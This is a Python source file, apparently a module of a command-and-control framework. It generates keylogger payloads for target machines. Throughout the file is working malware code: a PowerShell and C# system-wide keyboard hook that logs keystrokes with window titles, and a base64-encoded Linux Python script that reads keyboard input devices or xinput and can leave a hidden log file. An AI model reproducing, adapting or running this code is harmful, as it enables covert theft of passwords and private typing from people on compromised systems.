from sqlmodel import Session

from .base_module import BaseModule


class Keylogger(BaseModule):
    """Keylogger payload generator.

    Windows: Uses SetWindowsHookEx (WH_KEYBOARD_LL) via Add-Type to capture
    keystrokes system-wide, with active window tracking.

    Linux: Inline Python script that reads /dev/input/event* (root) or
    falls back to xinput (X11, no root). Python is guaranteed available
    since the C2 client itself runs on Python.

    Parameters
    ----------
    duration : int
        How many seconds to capture keystrokes (default: 60).
    output_mode : str
        "stdout" — print captured keys to stdout (returned via C2 output).
        "file"  — also write to a temp file on the target.
    """

    def generate_payload(
        self,
        target_os: str,
        session: Session,
        target_id: str,
        **params,
    ) -> str:
        duration: int = params.get("duration", 60)
        output_mode: str = params.get("output_mode", "stdout")

        os_lower = target_os.lower()
        if "windows" in os_lower or "win" in os_lower:
            script = self._build_ps_script(duration, output_mode)
            return self._wrap_powershell(script)
        else:
            return self._build_linux_command(duration, output_mode)

    @staticmethod
    def _build_ps_script(duration: int, output_mode: str) -> str:
        return f'''
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

public class KL {{
    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern int GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    private static IntPtr hookId = IntPtr.Zero;
    private static HookProc proc;
    private static StringBuilder buffer = new StringBuilder();
    private static string lastWindow = "";

    public static string Buffer {{ get {{ return buffer.ToString(); }} }}

    public static void Start() {{
        proc = HookCallback;
        using (var curProc = Process.GetCurrentProcess())
        using (var curMod = curProc.MainModule) {{
            hookId = SetWindowsHookEx(13, proc, GetModuleHandle(curMod.ModuleName), 0);
        }}
    }}

    public static void Stop() {{
        if (hookId != IntPtr.Zero) {{
            UnhookWindowsHookEx(hookId);
            hookId = IntPtr.Zero;
        }}
    }}

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {{
        if (nCode >= 0 && (int)wParam == 0x0100) {{
            int vkCode = Marshal.ReadInt32(lParam);
            uint scanCode = (uint)Marshal.ReadInt32(lParam, 8);

            IntPtr fg = GetForegroundWindow();
            StringBuilder winTitle = new StringBuilder(256);
            GetWindowText(fg, winTitle, 256);
            string currentWindow = winTitle.ToString();
            if (currentWindow != lastWindow && !string.IsNullOrEmpty(currentWindow)) {{
                buffer.AppendLine();
                buffer.AppendLine("[" + currentWindow + "]");
                lastWindow = currentWindow;
            }}

            byte[] keyState = new byte[256];
            GetKeyboardState(keyState);
            StringBuilder chars = new StringBuilder(4);
            int result = ToUnicode((uint)vkCode, scanCode, keyState, chars, chars.Capacity, 0);
            if (result > 0) {{
                buffer.Append(chars.ToString(0, result));
            }} else {{
                switch ((Keys)vkCode) {{
                    case Keys.Enter:    buffer.AppendLine(); break;
                    case Keys.Tab:      buffer.Append("[TAB]"); break;
                    case Keys.Back:     buffer.Append("[BS]"); break;
                    case Keys.Delete:   buffer.Append("[DEL]"); break;
                    case Keys.Escape:   buffer.Append("[ESC]"); break;
                    case Keys.LControlKey: case Keys.RControlKey: buffer.Append("[CTRL]"); break;
                    case Keys.LMenu: case Keys.RMenu: buffer.Append("[ALT]"); break;
                }}
            }}
        }}
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }}
}}
"@ -ReferencedAssemblies System.Windows.Forms

[KL]::Start()

$timer = [System.Diagnostics.Stopwatch]::StartNew()
while ($timer.Elapsed.TotalSeconds -lt {duration}) {{
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 10
}}

[KL]::Stop()

$captured = [KL]::Buffer
{"$captured | Out-File -FilePath ($env:TEMP + '\\\\kl.log') -Encoding UTF8" if output_mode == "file" else ""}
Write-Output $captured
'''

    @staticmethod
    def _build_linux_command(duration: int, output_mode: str) -> str:
        file_line = ""
        if output_mode == "file":
            file_line = "open('/tmp/.kl.log','w').write(result)"

        # Inline Python script — avoids all bash escaping issues and is
        # reliable since the C2 client guarantees Python is present.
        py_script = f'''
import os, sys, time, struct, glob, subprocess, select

DURATION = {duration}
keys = []
end_time = time.time() + DURATION

KEY_NAMES = {{
    1:"ESC",2:"1",3:"2",4:"3",5:"4",6:"5",7:"6",8:"7",9:"8",10:"9",
    11:"0",12:"-",13:"=",14:"[BS]",15:"[TAB]",16:"q",17:"w",18:"e",
    19:"r",20:"t",21:"y",22:"u",23:"i",24:"o",25:"p",26:"[",27:"]",
    28:"[ENTER]",29:"[LCTRL]",30:"a",31:"s",32:"d",33:"f",34:"g",
    35:"h",36:"j",37:"k",38:"l",39:";",40:"'",41:"`",42:"[LSHIFT]",
    43:"\\\\",44:"z",45:"x",46:"c",47:"v",48:"b",49:"n",50:"m",51:",",
    52:".",53:"/",54:"[RSHIFT]",55:"*",56:"[ALT]",57:" ",58:"[CAPS]",
}}

def try_evdev():
    if os.geteuid() != 0:
        return None
    for dev in sorted(glob.glob("/dev/input/event*")):
        try:
            name_path = "/sys/class/input/" + os.path.basename(dev) + "/device/name"
            if os.path.exists(name_path):
                name = open(name_path).read().lower()
                if "keyboard" in name or "kbd" in name:
                    return dev
        except Exception:
            continue
    return None

def capture_evdev(dev_path):
    fmt = "llHHI"
    ev_size = struct.calcsize(fmt)
    fd = os.open(dev_path, os.O_RDONLY | os.O_NONBLOCK)
    try:
        while time.time() < end_time:
            r, _, _ = select.select([fd], [], [], 0.5)
            if r:
                try:
                    data = os.read(fd, ev_size * 16)
                except BlockingIOError:
                    continue
                for i in range(0, len(data) - ev_size + 1, ev_size):
                    _, _, ev_type, ev_code, ev_value = struct.unpack(fmt, data[i:i+ev_size])
                    if ev_type == 1 and ev_value == 1:
                        keys.append(KEY_NAMES.get(ev_code, f"[{{ev_code}}]"))
    finally:
        os.close(fd)

def capture_xinput():
    kbd_id = None
    try:
        out = subprocess.check_output(["xinput", "list"], stderr=subprocess.DEVNULL, text=True)
        for line in out.splitlines():
            if "keyboard" in line.lower() and "Virtual core" not in line:
                for part in line.split():
                    if part.startswith("id="):
                        kbd_id = part[3:]
                        break
                if kbd_id:
                    break
        if not kbd_id:
            for line in out.splitlines():
                if "Virtual core keyboard" in line:
                    for part in line.split():
                        if part.startswith("id="):
                            kbd_id = part[3:]
                            break
    except Exception:
        return False
    if not kbd_id:
        return False
    try:
        proc = subprocess.Popen(
            ["xinput", "test", kbd_id],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
        )
        while time.time() < end_time:
            r, _, _ = select.select([proc.stdout], [], [], 0.5)
            if r:
                line = proc.stdout.readline()
                if line:
                    keys.append(line.strip())
        proc.terminate()
        return True
    except Exception:
        return False

# Try methods in order
method = "none"
dev = try_evdev()
if dev:
    method = "evdev:" + dev
    capture_evdev(dev)
elif capture_xinput():
    method = "xinput"

result = "[keylogger] method=" + method + " duration={duration}s captured=" + str(len(keys)) + " keys"
result += chr(10) + "".join(keys)
if not keys:
    result += "(no keystrokes captured)"
print(result)
{file_line}
'''
        import base64
        encoded = base64.b64encode(py_script.encode()).decode()
        return f'echo {encoded} | base64 -d | python3'
